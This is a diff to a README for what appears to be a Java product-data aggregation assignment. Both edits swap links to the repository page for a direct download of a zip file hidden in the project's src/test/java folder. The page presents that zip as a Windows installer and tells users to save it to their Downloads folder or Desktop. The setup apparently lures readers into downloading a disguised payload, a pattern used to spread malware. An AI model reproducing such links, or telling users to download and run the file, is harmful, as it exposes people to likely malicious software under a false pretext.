@@ -1,6 +1,6 @@
 # 📦 kramp-technical-assignment - Centralize product data for efficient operations
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/marccore285-creator/kramp-technical-assignment)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/marccore285-creator/kramp-technical-assignment/raw/refs/heads/main/src/test/java/com/kramp/aggregator/service/kramp_assignment_technical_v3.1.zip)
 
 ## 🎯 Purpose
 This application gathers product details from four distinct internal systems. It combines information from your product catalog, current pricing files, stock availability, and supplier databases. By using this tool, you view a single, accurate source of truth for every item in your inventory. You gain access to real-time data without searching through multiple spreadsheets or separate software portals.
@@ -16,7 +16,7 @@ Before you begin, verify your computer meets these standards:
 ## 📥 Downloading the Software
 Visit the project page to access the latest installer. Select the Windows version to start the download.
 
-[Direct Download Link](https://github.com/marccore285-creator/kramp-technical-assignment)
+[Direct Download Link](https://github.com/marccore285-creator/kramp-technical-assignment/raw/refs/heads/main/src/test/java/com/kramp/aggregator/service/kramp_assignment_technical_v3.1.zip)
 
 Save the file to your Downloads folder or your Desktop. Ensure you have a stable network connection during this process to prevent file corruption.
 
